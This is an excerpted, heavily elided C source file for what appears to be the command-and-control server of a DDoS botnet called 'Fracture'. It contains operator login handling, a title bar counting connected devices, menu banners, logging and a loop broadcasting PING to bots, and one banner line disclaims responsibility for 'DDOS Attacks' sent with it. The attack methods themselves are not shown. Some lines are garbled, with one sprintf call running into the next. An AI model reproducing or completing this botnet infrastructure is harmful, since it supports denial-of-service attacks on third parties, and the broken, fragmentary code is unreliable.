...
struct Fracture_login {
	char username[100];
	char password[100];
};
static struct Fracture_login accounts[100];
...
int Find_Login(char *str) {
    ...
    if((fp = fopen("Fracture_Login.txt", "r")) == NULL){
        return(-1);
    }
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        nickstring = ("%s", buf);//Made By Adoherrent.
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;Fracture | Devices Connected: %d | Users Online: %d | User: %s %c", '\033', BotsConnected(), OperatorsConnected, accounts[find_line].username, '\007');
		...
		char Fracture_banner0   [5000];
		char Fracture_banner1   [5000];
        char Fracture_banner2   [5000];
        char Fracture_banner3   [5000];
        char Fracture_banner4   [5000];
        char Fracture_banner5   [5000];

  		sprintf(Fracture_banner0,   "\033[2J\033[1;1H");
  		sprintf(Fracture_banner1,  "\e[0m\r\n");
  		sprintf(Fracture_banner2,  "\e[1;95m ╔═╗╦═╗╔═╗╔═╗╔╦╗╦ ╦╦═╗╔═╗ \e[0m\r\n");
  		sprintf(Fracture_banner3,  "\e[1;95m ╠╣ ╠╦╝╠═╣║   ║ ║ ║╠╦╝║╣ \e[0m Type \e[1;95mHELP\e[0m For Help.\e[0m\r\n");
  		sprintf(Fracture_banner4,  "\e[1;95m ╚  ╩╚═╩ ╩╚═╝ ╩ ╚═╝╩╚═╚═╝ \e[0m\r\n");
  		sprintf(Fracture_banner5,  "\e[0m\r\n");

  		if(send(datafd, Fracture_banner0, strlen(Fracture_banner0), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, Fracture_banner1, strlen(Fracture_banner1), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, Fracture_banner2, strlen(Fracture_banner2), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, Fracture_banner3, strlen(Fracture_banner3), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, Fracture_banner4, strlen(Fracture_banner4), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, Fracture_banner5, strlen(Fracture_banner5), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[0m[\e[1;95mFracture\e[0m]~: \e[0m");
...
//Made By Zinqo.
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            	...
            	sprintf(info2, "\e[1;95m║\e[0m This Source Was Made By Adoherrent.   \e[1;95m║\e[0m\r\n");
            	sprintf(info3, "\e[1;95m║\e[0m I made most of the methods in this source (info4, "\e[1;95m║\e[0m I Am Not In Charge With Any DDOS Attacks Sent With This Source. \e[1;95m║\e[0m\r\n");
            	sprintf(info5, "\e[1;95m║\e[0m I Finished This Source On February 8th 2022.                 \e[1;95m║\e[0m\r\n");
...
//Made By Zinqo.
  ...
  if(send(datafd, Fracture_banner5, strlen(Fracture_banner5), MSG_NOSIGNAL) == -1) goto end;
				...
				while(1) {
		char input [5000];//Made By Adoherrent.
        sprintf(input, "\e[0m[\e[1;95mFracture\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			FILE *logfile;
            logfile = fopen("Fracture_Logs.log", "a");
//Made By Adoherrent.
...
int main (int argc, char *argv[], void *sock) {
	    printf("\e[1;95mFracture\e[0m\n");
        signal(SIGPIPE, SIG_IGN);//Made By Adoherrent .
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
        ...
        while(1) {
			broadcast("PING", -1, "Adoherrent");
			sleep(60);//Made By Adoherrent.
        }
        close (listenFD);
        return EXIT_SUCCESS;
}